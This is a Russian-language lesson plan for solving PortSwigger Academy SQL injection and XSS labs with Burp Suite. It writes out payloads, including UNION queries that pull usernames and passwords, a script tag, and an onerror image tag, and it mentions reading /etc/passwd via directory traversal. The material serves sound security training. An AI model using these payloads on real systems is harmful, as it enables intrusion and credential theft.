# Занятие 54. PortSwigger Academy: Web Security, 5-10 лаб по SQLi/XSS

## Теория

**PortSwigger Academy** — бесплатная образовательная платформа от создателей Burp Suite. Содержит сотни лабораторных работ по веб-безопасности.

**Особенности:**
- Лаборатории запускаются в браузере
- Реалистичные уязвимые веб-приложения
- Подробная теория перед каждой лабой
- Автоматическая проверка решения

**Темы модуля "Web Security":**
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Directory Traversal
- Authentication vulnerabilities
- OAuth, JWT, WebSockets

**Burp Suite** — основной инструмент для прохождения лаб:
- **Proxy** — перехват трафика
- **Repeater** — повтор запросов с изменениями
- **Intruder** — автоматизированные атаки
- **Decoder** — кодирование/декодирование

## Практическое занятие

### Лабораторные по SQL Injection

#### Лаба 1: SQLi в фильтре товаров (учебная)
1. Откройте магазин, выберите категорию товаров
2. Перехватите запрос в Burp Proxy
3. Отправьте в Repeater
4. Измените параметр `category`: `' OR 1=1--`
5. Убедитесь, что отображаются все товары

#### Лаба 2: SQLi с UNION (определение столбцов)
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (ошибка = 2 столбца)
```
Используйте UNION:
```sql
' UNION SELECT NULL,NULL--
' UNION SELECT 'a','b'--
```

#### Лаба 3: Извлечение данных пользователей
```sql
' UNION SELECT username,password FROM users--
```

### Лабораторные по XSS

#### Лаба 4: Reflected XSS (в поиске)
Введите в поиск: `<script>alert(1)</script>`
Если скрипт выполнится — уязвимость есть.

#### Лаба 5: Stored XSS (в комментариях)
Оставьте комментарий с payload: `<img src=x onerror=alert(1)>`
При загрузке страницы скрипт выполнится у всех посетителей.

#### Лаба 6: DOM-based XSS
Изучите исходный код страницы, найдите место, где пользовательский ввод попадает в DOM без фильтрации.


## Задачи для самостоятельного выполнения

1. **SQLi лабы (еще 3-4 штуки)** — лабораторные на тему blind SQLi, time-based SQLi
2. **XSS лабы (еще 3-4 штуки)** — CSP bypass, XSS в атрибутах, фильтрация обхода
3. **Дополнительно: Directory Traversal** — лабораторная на чтение `/etc/passwd` через уязвимость в путях к файлам
